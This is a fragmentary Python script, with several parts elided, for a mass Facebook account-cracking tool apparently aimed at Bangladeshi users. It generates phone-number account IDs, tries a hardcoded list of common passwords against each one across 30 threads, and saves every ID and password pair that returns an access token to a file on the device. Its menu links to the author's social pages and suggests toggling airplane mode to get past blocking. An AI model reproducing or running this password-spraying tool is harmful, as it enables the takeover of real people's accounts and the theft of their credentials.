...
def Main():
    ...
    if 'Bangladesh' in country:
        ...
        print("\n\033[1;91m __[>] ONLY FOR BANGLADESH\n\n")

#___________Selection__________#
def Menu():
    os.system('clear')
    print(logo)
    print(f" \033[1;91m[\033[1;32m1\033[1;31m]{H} BD RANDOM CRACKING")
    print(f" \033[1;91m[\033[1;32m2\033[1;31m] {H}JOIN MESSENGER GROUP ")
    print(f" \033[1;91m[\033[1;32m3\033[1;31m] {H}CONTACT TOOL ADMIN ")
    print(f" \033[1;91m[\033[1;32mE\033[1;31m] {H}EXIT COMMAND ")
    ...
    if me in ["3","03"]:
        os.system("xdg-open https://facebook.com/itsjssj")
    if me in ["E","e"]:
        os.system('exit')
    if me in ["N","9"]:
    	tocl()
...
def xxt():
    ...
    os.system("clear")
    print(logo)
    os.system('xdg-open https://facebook.com/groups/19092123djdjdj751781/')
    ...
    cod ='+9163'
    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    os.system('xdg-open https://github.com/S3X-CYBER')
    ...
    with ThreadPool(max_workers=30) as KING:
        ...
        print(logo)
        tl = str(len(user))
        print(f'\033[1;97m╔══\033[1;91m[{H}❯\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\033[1;92mCRAKING LIMIT   \033[1;91m :\033[1;97m '+tl)
        print(f'\033[1;97m╠══\033[1;91m[{H}❯\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\033[1;92mCRAKING CODE\033[1;91m     :\033[1;97m '+code)
        print(f'\033[0;97m╚══\033[1;91m[{H}❯\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\x1b[32;1mIF NOO RESULT \033[1;97m[\033[1;93mON\033[1;97m/\033[1;93mOFF\033[1;97m]\033[1;92m AIRPLANE MODE')
        print('\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','57273200','i love you','708090','203040','506070','ayesha','Bangladesh','jannat',]
            ids = code+love
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mDETECTING\033[1;90m]-[\033[1;93m{loop}\033[1;90m]-[\033[1;97m{tl}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\033[1;91m [\033[1;92mSAMI-OK\033[1;91m]\033[1;92m '+ids+' | '+pas+'\033[1;92m')
                oks.append(ids)
                open('/sdcard/sami-ok.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
